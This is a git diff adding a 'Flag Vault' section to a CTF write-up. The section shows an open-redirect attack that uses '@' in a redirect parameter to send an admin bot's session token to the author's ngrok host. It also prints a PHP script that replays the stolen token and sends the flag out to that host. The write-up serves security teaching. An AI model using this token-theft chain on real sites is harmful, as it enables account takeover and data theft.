@@ -255,11 +255,11 @@ It works now, because there is no dot and the ```path.resolve``` method has the 
 
 ## Challenge
 
-![Logo](img/careers-page.png)
-
 We start with a main page and a ```careers.php``` page.
 
 ```Upload your CV using txt format only, please archive the files using zip format```
+
+![Logo](img/careers-page.png)
 
 Let's add our zipped resumee to test it:
 
@@ -330,6 +330,129 @@ INTENT{zipfiles_are_awsome_for_pt}
 
 ```INTENT{zipfiles_are_awsome_for_pt}```
 
+
+# Flag Vault
+
+![flag-vault-description](img/flag-vault-description.png)
+
+## Challenge
+
+In this challenge, we are sent to a ```/admin``` but, because we are not logged, it redirects us to ```/?redirect=/admin&error=INVALID_TOKEN```.
+
+![flag-vault-page](img/flag-vault-page.png)
+
+It has also a ```Report Bug``` functionality, where you can send a URL for analysis.
+
+There is no server-side source code, but the local Javascript in the login page is interesting:
+
+```javascript
+const params = new URLSearchParams(window.location.search);
+const query = Object.fromEntries(params.entries());
+const redirectTo = String(query.redirect || "");
+
+const form = document.querySelector("form");
+const email = document.querySelector("input[name=email]");
+const password = document.querySelector("input[name=password]");
+
+form.addEventListener("submit", async function (event) {
+    event.preventDefault();
+
+    const jsonBody = JSON.stringify({ email: email.value, password: password.value });
+
+    const response = await fetch("/api/v1/login", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: jsonBody
+    });
+
+    if (response.status === 401) {
+        return alert("Invalid email or password");
+    }
+
+    const jsonData = await response.json();
+    window.location = location.origin + redirectTo + "?token=" + jsonData.token;
+});
+
+function report() {
+    const url = prompt("URL", window.location.href);
+    fetch("/api/v1/report?url=" + encodeURIComponent(url));
+}
+```
+
+In summary, it tries to login with user-provided credentials. If the user gets authenticated, it returns a token and redirects us to ```/admin?token=TOKEN_VALUE```.
+
+* Flag is naturally on ```/admin```
+* We need the token to get the flag in the way god wanted.
+
+## Hacking
+
+The report URL, as in many other CTFs, is an admin (bot), which checks our URL and will be already logged in the app, with special privileges.
+
+The "intended" behaviour of the app, after receiving the ```redirect``` in the querystring, is to redirect inside the app, by concatenating the app base URL (```location.origin```) before the redirect path.
+
+For our current URL, ```http://flag-vault.chal.intentsummit.org/?redirect=/admin&error=INVALID_TOKEN```, it means:
+
+* location.origin: ```http://flag-vault.chal.intentsummit.org```
+* redirect: ```/admin```
+* Boring concatenation: ```http://flag-vault.chal.intentsummit.org/admin```
+
+This concatenation is what makes the app ~~in~~-vulnerable.
+As thought by the master-hacker [Orange Tsai](https://twitter.com/orange_8361), [URLs are complex](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) :) 
+
+I explain a little bit of it in the writeup [redpwnCTF 2021 - Requester + Requester Strikes Back](https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/).
+
+We can have this (incomplete/simplified) format:
+http://user@domain/path?querystring
+
+If we put an "```@```" before the querystring, we can make the admin browser think the ```location.origin``` is an username instead of the domain. 
+
+Let's simulate it, using my ngrok endpoint:
+
+```http://flag-vault.chal.intentsummit.org/?redirect=@c292-201-17-126-102.ngrok.io/admin```
+
+Look what we got:
+
+![flag-vault-page](img/flag-vault-got-token.png)
+
+Let's check our pretty new token:
+
+```text
+$ curl -k http://flag-vault.chal.intentsummit.org/admin?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjM3MDkwNzQ1LCJleHAiOjE2MzcwOTA3NTV9.an2VDDvxF-glaG0OednzW6vu5daPGNX7Oft_b6TrvPo
+
+Found. Redirecting to /?redirect=/admin&error=TokenExpiredError%3A%20jwt%20expired
+```
+```TokenExpiredError```
+
+The token expires really fast, so we can't get the flag manually.
+Let's create a smarter endpoint, which will receive the token and get the flag faster for us.
+
+![flash](img/flash.jpg)
+
+```php
+<?php 
+
+$token = $_GET["token"];
+$target = "http://flag-vault.chal.intentsummit.org/admin?token=" . $token;
+$flag = file_get_contents($target);
+
+file_get_contents("https://c292-201-17-126-102.ngrok.io/flag?" . urlencode($flag));
+?>
+```
+
+Let it go:
+
+```http://flag-vault.chal.intentsummit.org/?redirect=@c292-201-17-126-102.ngrok.io/flash.php```
+
+And suddenly:
+
+![flash](img/flag-vault-get-flag.png)
+
+```INTENT{danger0us_0pen_red1rect}```
+
+P.S.: for some reason, I couldn't just save the flag locally in the PHP app (missing privileges). It was just faster to make another request.
+
 # References
 
 * INTENT CTF 2021: https://ctf.intentsummit.org/
@@ -337,6 +460,7 @@ INTENT{zipfiles_are_awsome_for_pt}
 * INTENT Cybersecurity Summit 2021: https://intentsummit.org/
 * ASISCTF 2021 - ASCII art as a service: https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/
 * Defenit CTF 2020 - TAR Analyzer: https://neptunian.medium.com/defenit-ctf-2020-write-up-tar-analyzer-web-hacking-29ed5be3f5f4
+* [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/)
 * Repo with the artifacts discussed here: https://github.com/Neptunians/intent-ctf-2021-writeup
 * Team: [FireShell](https://fireshellsecurity.team/)
 * Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
